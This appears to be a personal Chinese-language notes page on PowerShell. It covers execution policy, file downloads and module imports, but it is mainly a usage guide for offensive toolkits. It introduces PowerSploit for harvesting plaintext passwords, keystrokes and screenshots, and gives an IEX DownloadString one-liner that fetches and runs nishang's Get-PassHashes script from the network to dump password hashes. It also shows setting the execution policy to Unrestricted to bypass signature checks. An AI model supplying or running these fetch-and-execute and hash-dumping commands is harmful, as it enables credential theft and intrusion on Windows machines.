---
layout: docs
category : note
tagline: "powershell"
tags : [powershell, code, notes,test]
---

1.`powershell`执行脚本：

默认情况是阻止的，输入如下命令即可运行`powershell`脚本：
{% highlight bash %}
set-executionpolicy remotesigned
{% endhighlight %}

2.`powershell`脚本后缀为：`ps1`

3.route add,Nod32,portscan(no),mb_login(yes)

4.`powershell`下载文件：
{% highlight cpp %}
(new-object System.Net.WebClient).DownloadFile( 'http://down.360safe.com/inst.exe','I:\360.exe')
{% endhighlight %}

5.功能强大的 `powershell` 合集： [https://github.com/mattifestation/PowerSploit](https://github.com/mattifestation/PowerSploit).,可以获取明文口令、键盘记录、定时截图等。

用法简单说明：

将powersploit文件夹拷贝到`powershell`模块目录下，其模块目录可以通过
{% highlight bash %}
echo $Env:PSModulePath
{% endhighlight %}

查看模块目录。注意：文件夹名称必须是`powersploit`。然后导入模块：
{% highlight bash %}
import -m powersploit
{% endhighlight %}

接着就可以使用:
{% highlight bash %}
get-command -m powersploit
{% endhighlight %}

查看其命令，并可以`get-help` 查看其命令帮助了。

6.`powershell` 获取`HASH`：

获取`HASH`的`powershell`脚本为：[https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1).

使用方法有如下两种：

1).
{% highlight bash %}
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
{% endhighlight %}
2).
{% highlight bash %}
iex -command .\Get-PassHashes.ps1;get-passhashes 
{% endhighlight %}
（这种方式不正确,因为文件内容整体上没有被认为是字符串类型）。可用的方式是：在`get-passhashes.ps1`文件最后面，加上 `Get-PassHashes` 即可（因为文件只提供了函数定义，没有调用，我们加上调用语句 即可，调用时，这里不要加括号之类的，然后`powershell`中执行该文件即可。

3).导入模块
{% highlight bash %}
import-module Get-PassHashes.ps1
{% endhighlight %}
然后调用 `Get-PassHashes` 即可。也可以合起来一起写：
{% highlight bash %}
import-module .\Get-PassHashes.ps1;get-passhashes
{% endhighlight %}
7.导入模块

导入模块分为两种，一种是导入到系统模块，还有一直是导入到当前会话。

导入到系统模块，则会全局生效，需要拷贝到 `$Env:PSModulePath` 中指定的路径之下，并使用
{% highlight bash %}
import -m 模块名
{% endhighlight %}
即可导入。

导入到当前会话，只需要 
{% highlight bash %}
import-module 模块文件名
{% endhighlight %}
然后就可以调用其命令了。到`powershell`退出后，模块也跟着消逝。

如果导入模块时，报未经数字签名的错误，可以设置数字签名为不限制的来解决
{% highlight bash %}
Set-ExecutionPolicy Unrestricted
{% endhighlight %}
或者右键该文件，选择解除锁定